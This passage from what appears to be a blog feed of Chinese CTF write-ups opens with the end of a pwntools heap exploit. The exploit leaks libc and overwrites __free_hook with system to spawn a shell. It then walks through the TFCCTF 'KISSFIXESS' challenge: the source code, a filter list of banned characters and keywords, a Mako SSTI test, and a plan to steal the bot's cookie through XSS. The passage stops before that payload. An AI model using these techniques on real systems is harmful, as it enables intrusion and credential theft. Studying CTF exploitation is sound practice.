class="params">idx,size,string = <span class="string">b&quot;AAAAAAAA&quot;</span></span>):</span><br><span class="line">    rv(<span class="string">b&quot;input your choice &gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    rv(<span class="string">b&quot;input index: &quot;</span>)</span><br><span class="line">    sl(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line">    rv(<span class="string">b&quot;input size: &quot;</span>)</span><br><span class="line">    sl(<span class="string">f&quot;<span class="subst">&#123;size&#125;</span>&quot;</span>.encode())</span><br><span class="line">    rv(<span class="string">b&quot;input your note: &quot;</span>)</span><br><span class="line">    sl(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">idx</span>):</span><br><span class="line">    rv(<span class="string">b&quot;input your choice &gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    rv(<span class="string">b&quot;input index: &quot;</span>)</span><br><span class="line">    sl(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">idx</span>):</span><br><span class="line">    rv(<span class="string">b&quot;input your choice &gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    rv(<span class="string">b&quot;input index: &quot;</span>)</span><br><span class="line">    sl(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx,string</span>):</span><br><span class="line">    rv(<span class="string">b&quot;input your choice &gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    rv(<span class="string">b&quot;input index: &quot;</span>)</span><br><span class="line">    sl(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line">    rv(<span class="string">b&quot;input your new note: &quot;</span>)</span><br><span class="line">    sl(string)   </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x440</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line">    pause()</span><br><span class="line">    release(<span class="number">0</span>)</span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    rv(<span class="string">b&quot;now, show the note: &quot;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    main_arena = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span></span><br><span class="line">    libc.address = addr - <span class="number">0x60</span> - main_arena</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">     </span><br><span class="line">    release(<span class="number">1</span>)</span><br><span class="line">    change(<span class="number">1</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">    release(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>TFCCTF-KISSFIXESS</title>
    <url>/2025/09/03/TFCCTF-KISSFIXESS/</url>
    <content><![CDATA[<h2 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h2><p>这是一道 web 题，给了源码，主要的源码有两个，一个是 <code>main.py</code> ：</p>
<figure class="highlight python"><figcaption><span>from http.server import HTTPServer, BaseHTTPRequestHandler</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line"><span class="keyword">from</span> bot <span class="keyword">import</span> visit_url</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">from</span> mako.lookup <span class="keyword">import</span> TemplateLookup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">MODULE_DIR = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(MODULE_DIR):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(MODULE_DIR)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Warning: Could not create Mako module directory: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        MODULE_DIR = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Pixel Rainbow Name&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">        @import url(&#x27;https://fonts.googleapis.com/css2?family=Press+Start+2P&amp;display=swap&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        body &#123;</span></span><br><span class="line"><span class="string">            font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">            background-color: #222;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            display: flex;</span></span><br><span class="line"><span class="string">            flex-direction: column;</span></span><br><span class="line"><span class="string">            align-items: center;</span></span><br><span class="line"><span class="string">            justify-content: center;</span></span><br><span class="line"><span class="string">            min-height: 100vh;</span></span><br><span class="line"><span class="string">            margin: 0;</span></span><br><span class="line"><span class="string">            padding: 20px;</span></span><br><span class="line"><span class="string">            box-sizing: border-box;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .container &#123;</span></span><br><span class="line"><span class="string">            background-color: #333;</span></span><br><span class="line"><span class="string">            padding: 30px;</span></span><br><span class="line"><span class="string">            border: 5px solid #555;</span></span><br><span class="line"><span class="string">            box-shadow: 0 0 0 5px #444, 0 0 0 10px #333, 0 0 20px 10px #000;</span></span><br><span class="line"><span class="string">            text-align: center;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        h1 &#123;</span></span><br><span class="line"><span class="string">            font-size: 24px;</span></span><br><span class="line"><span class="string">            color: #0f0; /* Green for a retro feel */</span></span><br><span class="line"><span class="string">            margin-bottom: 20px;</span></span><br><span class="line"><span class="string">            text-shadow: 2px 2px #000;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        label &#123;</span></span><br><span class="line"><span class="string">            font-size: 16px;</span></span><br><span class="line"><span class="string">            color: #ccc;</span></span><br><span class="line"><span class="string">            display: block;</span></span><br><span class="line"><span class="string">            margin-bottom: 10px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        input[type=&quot;text&quot;] &#123;</span></span><br><span class="line"><span class="string">            font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">            padding: 10px;</span></span><br><span class="line"><span class="string">            font-size: 16px;</span></span><br><span class="line"><span class="string">            border: 3px solid #555;</span></span><br><span class="line"><span class="string">            background-color: #444;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            margin-bottom: 20px;</span></span><br><span class="line"><span class="string">            outline: none;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        input[type=&quot;submit&quot;] &#123;</span></span><br><span class="line"><span class="string">            font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">            padding: 10px 20px;</span></span><br><span class="line"><span class="string">            font-size: 16px;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            background-color: #007bff;</span></span><br><span class="line"><span class="string">            border: 3px solid #0056b3;</span></span><br><span class="line"><span class="string">            cursor: pointer;</span></span><br><span class="line"><span class="string">            transition: background-color 0.2s;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        input[type=&quot;submit&quot;]:hover &#123;</span></span><br><span class="line"><span class="string">            background-color: #0056b3;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .name-display &#123;</span></span><br><span class="line"><span class="string">            margin-top: 30px;</span></span><br><span class="line"><span class="string">            font-size: 32px; /* Base size for rainbow text */</span></span><br><span class="line"><span class="string">            font-weight: bold;</span></span><br><span class="line"><span class="string">            padding: 10px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .rainbow-text &#123;</span></span><br><span class="line"><span class="string">            /* Fallback for browsers that don&#x27;t support background-clip */</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            /* Rainbow effect */</span></span><br><span class="line"><span class="string">            background: linear-gradient(to right,</span></span><br><span class="line"><span class="string">                hsl(0, 100%, 50%),  /* Red */</span></span><br><span class="line"><span class="string">                hsl(30, 100%, 50%), /* Orange */</span></span><br><span class="line"><span class="string">                hsl(60, 100%, 50%), /* Yellow */</span></span><br><span class="line"><span class="string">                hsl(120, 100%, 50%),/* Green */</span></span><br><span class="line"><span class="string">                hsl(180, 100%, 50%),/* Cyan */</span></span><br><span class="line"><span class="string">                hsl(240, 100%, 50%),/* Blue */</span></span><br><span class="line"><span class="string">                hsl(300, 100%, 50%) /* Magenta */</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            -webkit-background-clip: text;</span></span><br><span class="line"><span class="string">            background-clip: text;</span></span><br><span class="line"><span class="string">            color: transparent; /* Make the text itself transparent */</span></span><br><span class="line"><span class="string">            /* Animate the gradient */</span></span><br><span class="line"><span class="string">            animation: rainbow_animation 6s ease-in-out infinite;</span></span><br><span class="line"><span class="string">            background-size: 400% 100%;</span></span><br><span class="line"><span class="string">            text-shadow: none; /* Remove any inherited text-shadow */</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        .rainbow-text span &#123; /* Ensure individual spans also get the effect if we were to wrap letters */</span></span><br><span class="line"><span class="string">             -webkit-background-clip: text;</span></span><br><span class="line"><span class="string">            background-clip: text;</span></span><br><span class="line"><span class="string">            color: transparent;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @keyframes rainbow_animation &#123;</span></span><br><span class="line"><span class="string">            0%, 100% &#123;</span></span><br><span class="line"><span class="string">                background-position: 0 0;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            50% &#123;</span></span><br><span class="line"><span class="string">                background-position: 100% 0;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .instructions &#123;</span></span><br><span class="line"><span class="string">            font-size: 12px;</span></span><br><span class="line"><span class="string">            color: #888;</span></span><br><span class="line"><span class="string">            margin-top: 30px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Pixel Name Display!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=&quot;GET&quot; action=&quot;/&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;name&quot;&gt;Enter Your Name:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name_input&quot; autofocus&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Show Fancy Name&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        % if name_to_display:</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;name-display&quot;&gt;</span></span><br><span class="line"><span class="string">                Your fancy name is:</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;rainbow-text&quot;&gt;NAME&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        % endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;p class=&quot;instructions&quot;&gt;</span></span><br><span class="line"><span class="string">            Enter a name and see it in glorious pixelated rainbow colors!</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;instructions&quot;&gt;</span></span><br><span class="line"><span class="string">            Escaped characters: $&#123;banned&#125;</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; value=&quot;Report Name&quot; onclick=&quot;reportName()&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            function reportName() &#123;</span></span><br><span class="line"><span class="string">                // Get from query string</span></span><br><span class="line"><span class="string">                const name = new URLSearchParams(window.location.search).get(&#x27;name_input&#x27;);</span></span><br><span class="line"><span class="string">                if (name) &#123;</span></span><br><span class="line"><span class="string">                    fetch(&#x27;/report&#x27;, &#123;</span></span><br><span class="line"><span class="string">                        method: &#x27;POST&#x27;,</span></span><br><span class="line"><span class="string">                        headers: &#123;</span></span><br><span class="line"><span class="string">                            &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span></span><br><span class="line"><span class="string">                        &#125;,</span></span><br><span class="line"><span class="string">                        body: JSON.stringify(&#123; name: name &#125;)</span></span><br><span class="line"><span class="string">                    &#125;)</span></span><br><span class="line"><span class="string">                    .then(response =&gt; &#123;</span></span><br><span class="line"><span class="string">                        if (response.ok) &#123;</span></span><br><span class="line"><span class="string">                            alert(&#x27;Name reported successfully!&#x27;);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                            alert(&#x27;Failed to report name.&#x27;);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                    &#125;)</span></span><br><span class="line"><span class="string">                    .catch(error =&gt; &#123;</span></span><br><span class="line"><span class="string">                        console.error(&#x27;Error reporting name:&#x27;, error);</span></span><br><span class="line"><span class="string">                    &#125;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">lookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)</span><br><span class="line"></span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Renders the HTML page with the given name.&quot;&quot;&quot;</span></span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleHTTPRequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the path and extract query parameters</span></span><br><span class="line">        parsed_url = urlparse(<span class="variable language_">self</span>.path)</span><br><span class="line">        params = parse_qs(parsed_url.query)</span><br><span class="line">        name = params.get(<span class="string">&quot;name_input&quot;</span>, [<span class="string">&quot;&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> name:</span><br><span class="line">                name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Render and return the page</span></span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(render_page(name_to_display=name).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Handle POST requests to report names</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&quot;/report&quot;</span>:</span><br><span class="line">            content_length = <span class="built_in">int</span>(<span class="variable language_">self</span>.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">            post_data = <span class="variable language_">self</span>.rfile.read(content_length)</span><br><span class="line">            name = json.loads(post_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)).get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Received name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> name:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Reported name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Name reported successfully!&quot;</span>)</span><br><span class="line">                Thread(target=visit_url, args=(name,)).start()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">400</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Bad Request: No name provided.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">404</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_server</span>(<span class="params">server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=<span class="number">8000</span></span>):</span><br><span class="line">    server_address = (<span class="string">&quot;0.0.0.0&quot;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Starting http server on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Access the page at http://0.0.0.0:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nServer stopped.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        httpd.server_close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run_server()</span><br></pre></td></tr></table></figure>

<p>还有一个是 <code>bot.py</code> ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">URL_BASE = <span class="string">&quot;http://localhost:8000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">name: <span class="built_in">str</span>, timeout: <span class="built_in">int</span> = <span class="number">30</span></span>):</span><br><span class="line">  chrome_opts = Options()</span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--headless=new&quot;</span>)</span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--disable-extensions&quot;</span>)</span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--disable-popup-blocking&quot;</span>)</span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--blink-settings=imagesEnabled=false&quot;</span>)  <span class="comment"># don&#x27;t load images</span></span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--log-level=3&quot;</span>)  <span class="comment"># reduce logging</span></span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">  </span><br><span class="line">  user_data_dir = tempfile.mkdtemp(prefix=<span class="string">&quot;chrome-profile-&quot;</span>)</span><br><span class="line">  chrome_opts.add_argument(<span class="string">f&quot;--user-data-dir=<span class="subst">&#123;user_data_dir&#125;</span>&quot;</span>)  <span class="comment"># use a temporary user data directory</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  chrome_opts.add_argument(<span class="string">&quot;--user-data-dir=/tmp/chrome&quot;</span>)  <span class="comment"># use a temporary user data directory</span></span><br><span class="line">  </span><br><span class="line">  driver = webdriver.Chrome(options=chrome_opts)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    driver.set_page_load_timeout(timeout)</span><br><span class="line">    driver.set_script_timeout(<span class="number">5</span>)</span><br><span class="line">    driver.get(URL_BASE)</span><br><span class="line">    driver.add_cookie(&#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;TFCCTF&#123;~&#125;&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    encoded_name = quote(name)</span><br><span class="line">    driver.get(<span class="string">f&quot;<span class="subst">&#123;URL_BASE&#125;</span>/?name_input=<span class="subst">&#123;encoded_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># allow some time for JS to execute</span></span><br><span class="line">    time.sleep(<span class="number">200</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line">  <span class="keyword">finally</span>:</span><br><span class="line">    driver.quit()</span><br></pre></td></tr></table></figure>

<p>先看 <code>main.py</code>，猛地看上去，有一些被 ban 掉的字符，然后还有一个 <code>template.render()</code>，看上去就是一个典型的 <code>SSTI</code>。</p>
<p>看一下源代码一开始的导入部分，是 <code>from mako.template import Template</code>，那应该就是 <code>mako</code> 的 <code>SSTI</code> 了。</p>
<p>开启 web 看一下：</p>
<p><img src="image14.webp" alt="image14"></p>
<p>是个能把我们输入的 <strong>“name”</strong> 变成彩色字体进行输出的网页，有个输入框，然后有个 <code>Show</code> 和 <code>Report</code> 的功能。</p>
<p>前面说的 <code>template.render()</code> 是存在于 <code>Show</code> 的功能部分，因此这里可能存在 <strong>SSTI</strong> 。</p>
<p>网上搜了一下 <code>mako</code> 的 SSTI ，找到对应的执行表达式是 <code>$&#123;&#125;</code> ，那就在网页的输入框里输入 <code>$&#123;7*7&#125;</code> 试试：</p>
<p><img src="image15.webp" alt="image15"></p>
<p>果然输出了 <code>49</code> ，说明这里存在 SSTI 。</p>
<p>再看看源码的 <code>Report</code> 部分，这里主要是执行了 <code>Thread(target=visit_url, args=(name,)).start()</code>，这个 <code>visit_url</code> 是一开始 <code>from bot import visit_url</code> 这里导入的，说明它就是 <code>bot.py</code> 里的那个函数。</p>
<p><code>visit_url</code> 里面干的事情是，它启动了一个浏览器，<strong>并且把 flag 放在了它的 Cookie 里面：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.add_cookie(&#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;TFCCTF&#123;~&#125;&quot;</span>,</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>说明我们要用某种方法获取到这个 Cookie 才行。</p>
<p>然后，它执行了 <code>driver.get(f&quot;&#123;URL_BASE&#125;/?name_input=&#123;encoded_name&#125;&quot;)</code> ，这个就是 <code>main.py</code> 里的 <code>Show</code> 的功能，也就是说，它访问了跟我们一样的页面，而且它的输入参数也和我们输入的内容是一样的。</p>
<p>那思路就比较清晰了，通过 SSTI 构造一个 <code>XSS</code> ，让 <code>bot</code> 访问这个 <code>XSS</code> 页面，从而获取到它的 <strong>Cookie</strong> 。</p>
<p>现在的主要问题在于，<code>main.py</code> ban 掉了一些字符串 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>同时，它也过滤了一些要实现 <strong>XSS</strong> 所必须的字符：</p>
